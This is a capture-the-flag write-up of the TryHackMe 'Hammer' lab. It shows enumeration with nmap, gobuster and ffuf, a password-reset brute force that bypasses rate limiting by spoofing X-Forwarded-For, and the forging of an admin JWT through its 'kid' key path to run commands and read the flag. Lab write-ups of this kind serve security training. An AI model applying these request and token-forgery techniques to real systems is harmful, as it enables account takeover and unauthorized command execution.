# TryHackMe Hammer Writeup

<img width="1901" height="350" alt="image" src="https://github.com/user-attachments/assets/4c4d110f-b9a4-4298-b82b-de6509fe2dbf" />

---

## Nmap scan

```ruby
nmap -sCV -Pn 10.65.160.140 -p-
```

<img width="1083" height="407" alt="image" src="https://github.com/user-attachments/assets/839f0420-24f9-4c59-a254-4b6775b626a4" />

## Gobuster

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.65.160.140:1337/ 
```

<img width="1266" height="565" alt="image" src="https://github.com/user-attachments/assets/8964d11b-e721-4d5d-965e-88fb7c951e34" />

## and boom look what i found in `http://10.65.160.140:1337/vendor/firebase/php-jwt/README.md`

<img width="1250" height="810" alt="image" src="https://github.com/user-attachments/assets/72eee8e2-66b4-44ed-b596-c016b340c3d3" />

<img width="1044" height="686" alt="image" src="https://github.com/user-attachments/assets/bbdd6e3a-0df0-4664-8ba8-df0e55c5ef89" />

```markdown
$privateKey = <<<EOD
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAuzWHNM5f+amCjQztc5QTfJfzCC5J4nuW+L/aOxZ4f8J3Frew
M2c/dufrnmedsApb0By7WhaHlcqCh/ScAPyJhzkPYLae7bTVro3hok0zDITR8F6S
JGL42JAEUk+ILkPI+DONM0+3vzk6Kvfe548tu4czCuqU8BGVOlnp6IqBHhAswNMM
78pos/2z0CjPM4tbeXqSTTbNkXRboxjU29vSopcT51koWOgiTf3C7nJUoMWZHZI5
HqnIhPAG9yv8HAgNk6CMk2CadVHDo4IxjxTzTTqo1SCSH2pooJl9O8at6kkRYsrZ
WwsKlOFE2LUce7ObnXsYihStBUDoeBQlGG/BwQIDAQABAoIBAFtGaOqNKGwggn9k
6yzr6GhZ6Wt2rh1Xpq8XUz514UBhPxD7dFRLpbzCrLVpzY80LbmVGJ9+1pJozyWc
VKeCeUdNwbqkr240Oe7GTFmGjDoxU+5/HX/SJYPpC8JZ9oqgEA87iz+WQX9hVoP2
oF6EB4ckDvXmk8FMwVZW2l2/kd5mrEVbDaXKxhvUDf52iVD+sGIlTif7mBgR99/b
c3qiCnxCMmfYUnT2eh7Vv2LhCR/G9S6C3R4lA71rEyiU3KgsGfg0d82/XWXbegJW
h3QbWNtQLxTuIvLq5aAryV3PfaHlPgdgK0ft6ocU2de2FagFka3nfVEyC7IUsNTK
bq6nhAECgYEA7d/0DPOIaItl/8BWKyCuAHMss47j0wlGbBSHdJIiS55akMvnAG0M
39y22Qqfzh1at9kBFeYeFIIU82ZLF3xOcE3z6pJZ4Dyvx4BYdXH77odo9uVK9s1l
3T3BlMcqd1hvZLMS7dviyH79jZo4CXSHiKzc7pQ2YfK5eKxKqONeXuECgYEAyXlG
vonaus/YTb1IBei9HwaccnQ/1HRn6MvfDjb7JJDIBhNClGPt6xRlzBbSZ73c2QEC
6Fu9h36K/HZ2qcLd2bXiNyhIV7b6tVKk+0Psoj0dL9EbhsD1OsmE1nTPyAc9XZbb
OPYxy+dpBCUA8/1U9+uiFoCa7mIbWcSQ+39gHuECgYAz82pQfct30aH4JiBrkNqP
nJfRq05UY70uk5k1u0ikLTRoVS/hJu/d4E1Kv4hBMqYCavFSwAwnvHUo51lVCr/y
xQOVYlsgnwBg2MX4+GjmIkqpSVCC8D7j/73MaWb746OIYZervQ8dbKahi2HbpsiG
8AHcVSA/agxZr38qvWV54QKBgCD5TlDE8x18AuTGQ9FjxAAd7uD0kbXNz2vUYg9L
hFL5tyL3aAAtUrUUw4xhd9IuysRhW/53dU+FsG2dXdJu6CxHjlyEpUJl2iZu/j15
YnMzGWHIEX8+eWRDsw/+Ujtko/B7TinGcWPz3cYl4EAOiCeDUyXnqnO1btCEUU44
DJ1BAoGBAJuPD27ErTSVtId90+M4zFPNibFP50KprVdc8CR37BE7r8vuGgNYXmnI
RLnGP9p3pVgFCktORuYS2J/6t84I3+A17nEoB4xvhTLeAinAW/uTQOUmNicOP4Ek
2MsLL2kHgL8bLTmvXV4FX+PXphrDKg1XxzOYn0otuoqdAQrkK4og
-----END RSA PRIVATE KEY-----
EOD;

$publicKey = <<<EOD
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuzWHNM5f+amCjQztc5QT
fJfzCC5J4nuW+L/aOxZ4f8J3FrewM2c/dufrnmedsApb0By7WhaHlcqCh/ScAPyJ
hzkPYLae7bTVro3hok0zDITR8F6SJGL42JAEUk+ILkPI+DONM0+3vzk6Kvfe548t
u4czCuqU8BGVOlnp6IqBHhAswNMM78pos/2z0CjPM4tbeXqSTTbNkXRboxjU29vS
opcT51koWOgiTf3C7nJUoMWZHZI5HqnIhPAG9yv8HAgNk6CMk2CadVHDo4IxjxTz
TTqo1SCSH2pooJl9O8at6kkRYsrZWwsKlOFE2LUce7ObnXsYihStBUDoeBQlGG/B
wQIDAQAB
-----END PUBLIC KEY-----
EOD;
```

> ## NOTICE IN Source code this comment 

<img width="874" height="277" alt="image" src="https://github.com/user-attachments/assets/4bb4a08e-fe06-4518-bf7a-94183f205289" />

```
ffuf -u http://10.65.160.140:1337/hmr_FUZZ/ \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -t 30
```

<img width="1252" height="572" alt="image" src="https://github.com/user-attachments/assets/aa9f19a6-b89d-47b1-8add-eb2f83b01d5a" />

```
http://10.65.160.140:1337/hmr_logs/
```

<img width="1120" height="240" alt="image" src="https://github.com/user-attachments/assets/009dd184-bfcf-4f4a-8f71-ac557683fbfc" />

<img width="1914" height="256" alt="image" src="https://github.com/user-attachments/assets/10560b60-2640-4d87-a020-87548333d089" />

```
[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down
```

> ## so we know that there is
>: user email **`tester@hammer.thm`**
>: endpoints :
   - /restricted-area
   - /admin-login
   - /protected
   - /locked-down 

## now i will try to do forget password for email that we found 

<img width="881" height="451" alt="image" src="https://github.com/user-attachments/assets/39f94b1e-b588-4534-8424-3c13c3350d48" />

<img width="1084" height="155" alt="image" src="https://github.com/user-attachments/assets/d201abb2-25f8-4b18-b04a-4a5807a14fab" />

> ## oh there is rate limit let's bypass it :

```http
POST /reset_password.php HTTP/1.1
Host: 10.65.160.140:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://10.65.160.140:1337
Connection: keep-alive
Referer: http://10.65.160.140:1337/reset_password.php
Cookie: PHPSESSID=ccfi7ti3a2qukdgcl0vrv54qcb
X-Forwarded-For: 127.0.0.1                                 <<==================== bypass ratelimit ===
Upgrade-Insecure-Requests: 1
Priority: u=0, i

recovery_code=0000&s=180
```

<img width="1516" height="522" alt="image" src="https://github.com/user-attachments/assets/09f4581b-fc47-4222-b6bf-3c3d5ddd86dd" />

```
seq -w 0000 9999 > numbers.txt
```

```
ffuf -w numbers.txt -u "http://10.65.160.140:1337/reset_password.php" -X "POST" -d "recovery_code=FUZZ&s=60" -H "Cookie: PHPSESSID=7qio6h5s6frkvbfaolcdcpl2rh" -H "X-Forwarded-For: FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid" -s
```

<img width="1398" height="402" alt="image" src="https://github.com/user-attachments/assets/61d8c277-20a2-44ef-9341-ff92cce61e10" />

```
tester@hammer.thm : pass123
```

<img width="1582" height="733" alt="image" src="https://github.com/user-attachments/assets/e47584c6-ee8e-4f39-a225-6e666009bf6a" />

<img width="1417" height="795" alt="image" src="https://github.com/user-attachments/assets/3ef354d3-b721-4199-b3d4-9ef338609061" />

## wooh but wait session ends very fast ?!!!1

<img width="1210" height="417" alt="image" src="https://github.com/user-attachments/assets/50c523d4-3ba5-47d1-a724-b119d6082ce2" />

## let's take look at it 

<img width="1672" height="638" alt="image" src="https://github.com/user-attachments/assets/2c760fc1-e8da-4331-a991-1c4cc72bc5aa" />

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzcxMDIzMzA0LCJleHAiOjE3NzEwMjY5MDQsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.fzlv6opuqsIx1rJjo-HjPB5UhSscx-ikH722LJ7-OtI
```

<img width="1186" height="536" alt="image" src="https://github.com/user-attachments/assets/a218c3d2-d4c1-4b68-b3c6-ca5665111df3" />

There are two interesting parts in the JWT. Let's analyze them: "kid" --- This shows the key ID used to sign the token. It points to a file path, which means the signing key might be stored there. "role" --- This tells us the user's role is "user" (not admin).

If you remember, we previously saw a file named `188ade1.key` in `dashboard.php`, but we couldn't read it because the `cat` command didn't work. Let's try to view its content using `curl`

> ## lets get content of `188ade1.key`

```
curl -s http://10.65.160.140:1337/188ade1.key
```

<img width="702" height="112" alt="image" src="https://github.com/user-attachments/assets/4303e674-bd39-4616-bcee-a474e133c54e" />

```
56058354efb3daa97ebab00fabd7a7d7
```

> ## now edit JWT

<img width="849" height="590" alt="image" src="https://github.com/user-attachments/assets/1bd09b0d-11bd-43ec-abdc-93692422c8c2" />

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzcxMDI0NjY3LCJleHAiOjE3NzEwMjgyNjcsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.1oauD2sC2SMQkDyPqJgGBxuOeQfX-rOl5bLtU5u_Q-A
```

```
curl -c cookies.txt -X POST http://10.65.160.140:1337/index.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=tester@hammer.thm&password=pass123"

```

```
curl -b cookies.txt -X POST http://10.65.160.140:1337/execute_command.php \
  -H "Content-Type: application/json" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzcxMDI0NjY3LCJleHAiOjE3NzEwMjgyNjcsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.1oauD2sC2SMQkDyPqJgGBxuOeQfX-rOl5bLtU5u_Q-A" \
  -d '{"command":"cat /home/ubuntu/flag.txt"}'

```

<img width="1268" height="320" alt="image" src="https://github.com/user-attachments/assets/2ba10dae-c406-44c2-8a23-e9af1f532fb2" />

```json
{
  "output":"THM{RUNANYCOMMAND1337}\n"
}  
```

